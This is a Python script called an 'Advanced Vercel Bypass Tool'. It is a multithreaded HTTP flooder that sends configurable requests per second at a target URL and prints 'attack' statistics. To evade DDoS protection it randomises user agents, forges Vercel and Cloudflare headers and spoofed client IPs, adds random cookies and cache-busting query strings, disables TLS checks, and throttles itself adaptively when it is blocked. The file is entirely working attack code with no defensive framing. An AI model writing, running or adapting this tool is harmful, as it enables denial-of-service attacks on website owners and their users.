import requests
import threading
import time
import argparse
import random
import socket
import ssl
import http.client
import urllib3
from fake_useragent import UserAgent
from colorama import Fore, Style, init
import dns.resolver
import os
import sys
import json
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
import base64

# Initialize colorama
init(autoreset=True)

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Enhanced User-Agent list with browser-like signatures
ua = UserAgent()

# Global counters
success_count = 0
error_count = 0
timeout_count = 0
redirect_count = 0
blocked_count = 0
lock = threading.Lock()

# DNS cache
dns_cache = {}

# Vercel-specific bypass techniques
VERCEL_BYPASS_TECHNIQUES = [
    "x-vercel-ip-bypass",
    "x-vercel-id",
    "x-real-ip",
    "x-forwarded-proto",
    "x-vercel-deployment-url"
]

def generate_vercel_headers():
    """Generate headers that mimic Vercel's internal routing"""
    return {
        "x-vercel-id": ''.join(random.choices("0123456789abcdef", k=16)),
        "x-vercel-forwarded-for": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "x-vercel-proxy-signature": generate_proxy_signature(),
        "x-vercel-scope": "preview|production",
        "x-vercel-deployment-url": "https://" + ''.join(random.choices("abcdefghijklmnopqrstuvwxyz", k=12)) + ".vercel.app"
    }

def generate_proxy_signature():
    """Generate fake proxy signature"""
    dummy_data = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=32))
    return base64.b64encode(dummy_data.encode()).decode()

def get_random_headers():
    """Generate random headers with Vercel bypass techniques"""
    headers = {
        "User-Agent": ua.random,
        "Accept": random.choice([
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "*/*",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
        ]),
        "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "id-ID,id;q=0.7"]),
        "Accept-Encoding": random.choice(["gzip, deflate, br", "gzip, deflate"]),
        "Connection": random.choice(["keep-alive", "close"]),
        "Cache-Control": random.choice(["max-age=0", "no-cache", "no-store"]),
        "Pragma": random.choice(["no-cache", ""]),
        "Referer": random.choice([
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://vercel.com/",
            "https://nextjs.org/"
        ]),
        "Sec-Fetch-Dest": random.choice(["document", "empty"]),
        "Sec-Fetch-Mode": random.choice(["navigate", "cors"]),
        "Sec-Fetch-Site": random.choice(["same-origin", "none", "cross-site"]),
        "Sec-Fetch-User": random.choice(["?1", ""]),
        "Upgrade-Insecure-Requests": random.choice(["1", ""]),
        "TE": random.choice(["Trailers", ""])
    }

    # Add Vercel bypass headers 50% of the time
    if random.random() > 0.5:
        headers.update(generate_vercel_headers())

    # Add cloudflare bypass headers 30% of the time
    if random.random() > 0.7:
        headers.update({
            "cf-connecting-ip": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "cf-ray": f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))}-{random.randint(1000,9999)}"
        })

    return headers

def rotate_ip():
    """Rotate IP using proxy or Tor (placeholder implementation)"""
    # In a real implementation, you would rotate proxies here
    return {}

def resolve_dns(domain):
    """DNS resolution with caching and round-robin"""
    if domain in dns_cache:
        if len(dns_cache[domain]) > 1:
            # Rotate IPs for load balancing
            dns_cache[domain].append(dns_cache[domain].pop(0))
        return dns_cache[domain]
    
    try:
        answers = dns.resolver.resolve(domain, 'A')
        ips = [str(r) for r in answers]
        dns_cache[domain] = ips
        return ips
    except:
        return None

def send_request(url, method="GET", payload=None):
    """Send HTTP request with advanced bypass techniques"""
    global success_count, error_count, timeout_count, redirect_count, blocked_count
    
    parsed_url = urllib3.util.parse_url(url)
    domain = parsed_url.host
    path = parsed_url.path or "/"
    
    headers = get_random_headers()
    cookies = {}
    
    # Rotate IP occasionally
    if random.random() > 0.8:
        headers.update(rotate_ip())

    try:
        # Vary request methods
        if random.random() > 0.3:  # 70% chance to use requests
            # Add random cookies 50% of the time
            if random.random() > 0.5:
                cookies = {
                    '__cfduid': ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=43)),
                    '_vercel_jwt': ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=128)),
                    'cookieConsent': 'true'
                }

            # Random path variations
            if random.random() > 0.7:
                path = path + "?" + "&".join([
                    f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5))}={random.randint(1,100)}"
                    for _ in range(random.randint(1,3))
                ])

            res = requests.request(
                method,
                url,
                headers=headers,
                cookies=cookies,
                data=payload,
                timeout=10,
                verify=False,
                allow_redirects=False,
                stream=True
            )

            # Check for security checkpoint
            if res.status_code in [403, 429, 503] and any(indicator in res.text.lower() for indicator in ['security', 'vercel', 'checking', 'ddos']):
                with lock:
                    blocked_count += 1
                return None

            with lock:
                success_count += 1
                if res.status_code in [301, 302, 303, 307, 308]:
                    redirect_count += 1

            return res

        else:  # 30% chance to use low-level sockets
            ips = resolve_dns(domain)
            if not ips:
                with lock:
                    error_count += 1
                return None
            
            ip = random.choice(ips)
            port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
            
            # Add Host header for virtual hosting
            headers["Host"] = domain
            
            # Add SNI for HTTPS
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            if parsed_url.scheme == "https":
                conn = http.client.HTTPSConnection(ip, port, timeout=10, context=context)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=10)
            
            # Random path variations
            if random.random() > 0.6:
                path = path + "?" + "&".join([
                    f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5))}={random.randint(1,100)}"
                    for _ in range(random.randint(1,2))
                ])
            
            conn.request(method, path, headers=headers, body=payload)
            res = conn.getresponse()
            
            # Check for security checkpoint
            if res.status in [403, 429, 503] and any(indicator in res.read().decode('utf-8', 'ignore').lower() for indicator in ['security', 'vercel', 'checking', 'ddos']):
                with lock:
                    blocked_count += 1
                return None

            with lock:
                success_count += 1
                if res.status in [301, 302, 303, 307, 308]:
                    redirect_count += 1
            
            return res

    except requests.exceptions.Timeout:
        with lock:
            timeout_count += 1
    except requests.exceptions.TooManyRedirects:
        with lock:
            redirect_count += 1
    except Exception as e:
        with lock:
            error_count += 1
    return None

def attack(url, duration, rps, methods, payloads):
    """Main attack function with adaptive techniques"""
    end_time = time.time() + duration
    methods = methods.split(',')
    
    while time.time() < end_time:
        threads = []
        for _ in range(rps):
            method = random.choice(methods)
            payload = random.choice(payloads) if payloads and method in ["POST", "PUT"] else None
            
            # Adaptive technique selection
            if blocked_count > success_count / 10:
                # If getting blocked too often, slow down and rotate more
                time.sleep(random.uniform(0.5, 1.5))
                t = threading.Thread(target=send_request, args=(url, method, payload))
            else:
                # Aggressive mode
                t = threading.Thread(target=send_request, args=(url, method, payload))
            
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Adaptive delay based on block rate
        if blocked_count > success_count / 20:
            time.sleep(random.uniform(1.0, 2.0))
        else:
            time.sleep(random.uniform(0.2, 0.8))
        
        # Wait for threads to complete
        for t in threads:
            t.join(timeout=15)

def print_stats():
    """Display statistics during the attack"""
    while True:
        time.sleep(5)
        with lock:
            print(f"\n{Fore.CYAN}[STATS]{Style.RESET_ALL} Success: {Fore.GREEN}{success_count}{Style.RESET_ALL} | "
                  f"Blocked: {Fore.RED}{blocked_count}{Style.RESET_ALL} | "
                  f"Errors: {Fore.YELLOW}{error_count}{Style.RESET_ALL} | "
                  f"Timeouts: {Fore.MAGENTA}{timeout_count}{Style.RESET_ALL} | "
                  f"Redirects: {Fore.BLUE}{redirect_count}{Style.RESET_ALL}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced Vercel Bypass Tool")
    parser.add_argument("--url", required=True, help="Target URL (e.g., https://vercel-app.vercel.app)")
    parser.add_argument("--duration", type=int, default=120, help="Duration in seconds")
    parser.add_argument("--rps", type=int, default=50, help="Requests per second")
    parser.add_argument("--methods", default="GET,POST,HEAD,OPTIONS", 
                       help="HTTP methods to use (comma separated)")
    parser.add_argument("--payloads", default="vercel_payloads.txt", 
                       help="File containing bypass payloads")
    
    args = parser.parse_args()
    
    # Load payloads if file exists
    payloads = []
    if os.path.exists(args.payloads):
        with open(args.payloads, "r") as f:
            payloads = [line.strip() for line in f if line.strip()]
    else:
        # Default Vercel bypass payloads
        payloads = [
            '_vercel_bypass=1',
            '_vercel_jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
            '__cfduid=' + ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=43)),
            'vercel-bypass=true'
        ]
    
    print(f"{Fore.YELLOW}[!] Starting Vercel bypass attack to {args.url}{Style.RESET_ALL}")
    print(f"{Fore.BLUE}[i] Duration: {args.duration} sec | RPS: {args.rps} | Methods: {args.methods}{Style.RESET_ALL}")
    print(f"{Fore.BLUE}[i] Using {len(payloads)} bypass payloads{Style.RESET_ALL}")
    
    # Start stats thread
    stats_thread = threading.Thread(target=print_stats)
    stats_thread.daemon = True
    stats_thread.start()
    
    # Start attack
    try:
        attack(args.url, args.duration, args.rps, args.methods, payloads)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Attack interrupted by user{Style.RESET_ALL}")
    
    print(f"\n{Fore.GREEN}[✓] Attack completed.{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[+] Total requests:{Style.RESET_ALL}")
    print(f"  Success: {Fore.GREEN}{success_count}{Style.RESET_ALL}")
    print(f"  Blocked: {Fore.RED}{blocked_count}{Style.RESET_ALL}")
    print(f"  Errors: {Fore.YELLOW}{error_count}{Style.RESET_ALL}")
    print(f"  Timeouts: {Fore.MAGENTA}{timeout_count}{Style.RESET_ALL}")
    print(f"  Redirects: {Fore.BLUE}{redirect_count}{Style.RESET_ALL}")